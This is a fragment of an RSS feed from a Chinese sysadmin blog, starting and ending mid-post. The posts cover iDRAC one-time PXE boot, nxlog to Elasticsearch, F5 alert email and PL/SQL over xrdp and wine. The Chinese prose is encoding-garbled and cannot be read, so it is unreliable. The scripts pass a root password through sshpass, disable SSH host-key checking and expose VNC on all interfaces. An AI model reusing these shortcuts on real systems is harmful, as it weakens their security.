&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;BRIDGE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;br0&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; EOF 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; %end
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼Œå®‰è£…åŒ…å¿…é¡»å®‰è£…bridge-utilsï¼Œå¦åˆ™æ²¡æœ‰brctlï¼Œæ— æ³•å¯åŠ¨br0ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dell idrac é‡å¯æœºå™¨è¿›å…¥å•æ¬¡pxeå®‰è£…</title>
      <link>https://rendoumi.com/posts/20240118-idrac_pxe/</link>
      <pubDate>Thu, 18 Jan 2024 10:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-idrac_pxe/</guid>
      <description>&lt;p&gt;ç”¨Dell idracçš„è„šæœ¬æ¥ä½¿æœåŠ¡å™¨è¿›å…¥å•æ¬¡pxeå®‰è£…è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;è„šæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@172.16.17.1 racadm &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; iDRAC.ServerBoot.BootOnce &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@172.16.17.1 racadm &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; iDRAC.ServerBoot.FirstBootDevice PXE  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@172.16.17.1 racadm serveraction powercycle  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>nxlogæ¨é€æ•°æ®åˆ°elasticsearch</title>
      <link>https://rendoumi.com/posts/20240118-nxlog_es/</link>
      <pubDate>Thu, 18 Jan 2024 09:25:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-nxlog_es/</guid>
      <description>&lt;p&gt;å…¶å®rsyslogã€syslog-ngã€nxlogè¿™ä¸‰ç§ä¸œè¥¿çœŸçš„æ˜¯éƒ½å·®ä¸å¤šã€‚éšä¾¿é€‰ä¸€ä¸ªç”¨éƒ½æ²¡é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”è¾ƒå–œæ¬¢nxlogçš„routeå’Œjsonä»¥åŠç®­å¤´çš„åŠŸèƒ½ï¼Œå¾ˆç®€æ´ï¼Œæ‰€ä»¥ç”¨å®ƒæ¥æ¨æ•°æ®åˆ°elasticsearch&lt;/p&gt;
&lt;h5 id=&#34;æ–¹æ³•ä¸€ç”¨om_elasticsearchæ¨&#34;&gt;æ–¹æ³•ä¸€ã€ç”¨om_elasticsearchæ¨ï¼š&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Input in&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Module im_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Host 0.0.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Port &lt;span class=&#34;m&#34;&gt;1514&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        InputType Binary
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/Input&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Output es&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Module om_elasticsearch
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        URL http://localhost:9200/_bulk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        FlushInterval &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        FlushLimit &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# Create an index daily&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Index strftime&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$EventTime&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;nxlog-%Y%m%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        IndexType &lt;span class=&#34;s2&#34;&gt;&amp;#34;My logs&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# Use the following if you don&amp;#39;t have $EventTime set&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;#Index strftime(now(),&amp;#34;nxlog-%Y%m%d&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/Output&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Route r&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Path &lt;span class=&#34;nv&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; es
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/Route&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;æ–¹æ³•äºŒç”¨om_httpæ¨&#34;&gt;æ–¹æ³•äºŒã€ç”¨om_httpæ¨ï¼š&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Output elasticsearch&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Module      om_http
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    URL         http://elasticsearch:9200
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ContentType application/json
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Exec        set_http_request_path&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strftime&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$EventTime&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;/nxlog-%Y%m%d/&amp;#34;&lt;/span&gt; + &lt;span class=&#34;nv&#34;&gt;$SourceModuleName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; rename_field&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;timestamp&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;@timestamp&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; to_json&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/Output&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ç”Ÿäº§ä¸Šæ˜¯å°†å„ä¸ªæœºå™¨ä¸Šçš„æ—¥å¿—é€šè¿‡rsyslogå‘åˆ°nxlogï¼Œå†ç”±nxlogå¯¼å…¥elasticsearchï¼Œç„¶åç”¨kinabaçœ‹ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>F5-bigipçš„Load balanceå‘Šè­¦é‚®ä»¶è®¾ç½®</title>
      <link>https://rendoumi.com/posts/20240118-f5_alert/</link>
      <pubDate>Thu, 18 Jan 2024 09:20:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-f5_alert/</guid>
      <description>&lt;p&gt;F5-Bigipè´Ÿè½½å‡è¡¡è®¾å¤‡ï¼Œåœ¨æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒï¼Œç”¨äºåˆ†å‘å‰ç«¯çš„è¯·æ±‚ï¼Œå¦‚æœåç«¯çš„æˆå‘˜ç¦»çº¿äº†ï¼Œéœ€è¦åŠæ—¶å¾—åˆ°é€šçŸ¥ã€‚&lt;/p&gt;
&lt;p&gt;è§„åˆ™æ˜¯ï¼šload balanceæ± å­é‡Œçš„æˆå‘˜å¦‚æœç¦»çº¿ï¼Œå°±å‘é€å‘Šè­¦é‚®ä»¶ï¼Œå¦‚æœåˆæ¢å¤äº†ï¼Œä¹Ÿå‘å‘Šè­¦é‚®ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä¸€ä¸ªé‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯qqçš„ä¼ä¸šé‚®ç®±ï¼Œå¦‚ä½•è®¾ç½®åœ¨ä¹‹å‰è¯´è¿‡ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯å†…ç½‘ç”¨è¿™å°æœåŠ¡å™¨å‘é‚®ä»¶ä¸éœ€è¦éªŒè¯ï¼Œä½†æ˜¯å‘é€è€…å¿…é¡»æ˜¯monit@company.comã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ¥ç¡®è®¤f5çš„ç‰ˆæœ¬ï¼Œä¸åŒçš„ç‰ˆæœ¬ä¸ä¸€å®šé€šç”¨æ’’ã€‚è¿™é‡Œç‰ˆæœ¬æ˜¯11.5.3æ‰å¯ä»¥ã€‚&lt;/p&gt;
&lt;p&gt;ç™»å½•F5(ipæ˜¯172.16.0.1)ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ï¼Œæ˜¯ä¸æ˜¯11.5.3&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ssh user@172.16.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# tmsh show /sys version&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Product  BIG-IP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Version  11.5.3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# quit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘/etc/ssmtp/ssmtp.confï¼Œè®¾ç½®é‚®ä»¶æœåŠ¡å™¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/ssmtp/ssmtp.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;mailhub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¦‚æœæ²¡æœ‰å®‰è£…å†…ç½‘çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œè®¾ç½®ã€‚å®‰è£…äº†å°±ä¸ç”¨è®¾&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;FromLineOverride&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;YES  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;UseTLS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AuthUser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;smtp_account  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AuthPass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;password  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®å‘Šè­¦å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_DOWN &lt;span class=&#34;s2&#34;&gt;&amp;#34;Pool (.*?) member (.*?):(.*?) monitor status down.&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        email &lt;span class=&#34;nv&#34;&gt;toaddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user01@company.com,user02@company.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;fromaddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;monit@company.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A pool member went down&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_UP &lt;span class=&#34;s2&#34;&gt;&amp;#34;Pool (.*?) member (.*?):(.*?) monitor status up.&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        email &lt;span class=&#34;nv&#34;&gt;toaddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user01@company.com,user02@company.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;fromaddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;monit@company.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A pool member went up&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œæå®šã€‚ä¸ç”¨é‡å¯ä»€ä¹ˆçš„å•Šï¼Œå³æ—¶ç”Ÿæ•ˆã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>åœ¨Ubuntuä¸Šè£…ä¸ªplsqlé€šè¿‡è¿œç¨‹æ¡Œé¢è®¿é—®oracle</title>
      <link>https://rendoumi.com/posts/20240118-plsql_linux/</link>
      <pubDate>Thu, 18 Jan 2024 09:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-plsql_linux/</guid>
      <description>&lt;p&gt;è¿™çœŸæ˜¯ä¸ªæ— æ¯”å¤æ€ªçš„å®¡è®¡éœ€æ±‚ï¼Œéœ€è¦è®©ä¸€äº›åŒäº‹èƒ½è®¿é—®oracleï¼Œä½†æ˜¯ä¸å…è®¸ä»–ä»¬é€šè¿‡å‰ªåˆ‡æ¿æ‹·è´æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;è¿™åªèƒ½æ˜¯kvm+Ubuntu+xrdp+wine+plsqlæ¥å®ç°äº†ï¼ˆCentOSåº”è¯¥ä¹Ÿæ²¡é—®é¢˜ï¼‰&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå‡†å¤‡ubuntuçš„isoï¼Œé€‰ç²¾ç®€çš„serverç‰ˆï¼Œæ¡Œé¢æ‰‹åŠ¨è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://mirrors.163.com/ubuntu-releases/12.04/ubuntu-12.04.5-server-i386.iso  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”Ÿæˆkvmè™šæœºç£ç›˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;qemu-img create -f qcow2 /home/kvm/ubuntu.qcow2 20G  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…kvmè™šæœºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-install &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    --name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ubuntu &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --vcpu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --ram&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --disk &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/kvm/ubuntu.qcow2,format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;qcow2,size&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --cdrom&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/kvm/ubuntu-12.04.5-server-i386.iso &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --os-type&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;linux  &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --vnc --vnclisten&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0 --vncport&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5901&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ—¶å€™å°±è¦è¿åˆ°å®æœºçš„vnc 5901ç«¯å£ï¼Œå¼€å§‹å®‰è£…ã€‚åæ­£æ˜¯åªè¦ç”¨plsqlçš„ï¼Œæ‰€ä»¥ç¼ºçœéƒ½å¯ã€‚è®°ä½è¦è£…ä¸Šsshd serverï¼Œä¾¿äºè¿œç¨‹ç®¡ç†ã€‚&lt;/p&gt;
&lt;p&gt;è£…ubuntuæ—¶ä¼šæç¤ºç”Ÿæˆä¸€ä¸ªérootç”¨æˆ·ï¼Œå°±å«plsqlå¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…ä¸è¡¨ï¼Œå®‰è£…å¥½äº†ä»¥åå› ä¸ºè£…äº†sshdï¼Œæ‰€ä»¥å°±å¯ä»¥sshè¿œç¨‹æ“ä½œäº†ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…wineï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install software-properties-common  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo add-apt-repository ppa:ubuntu-wine/ppa  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get update  
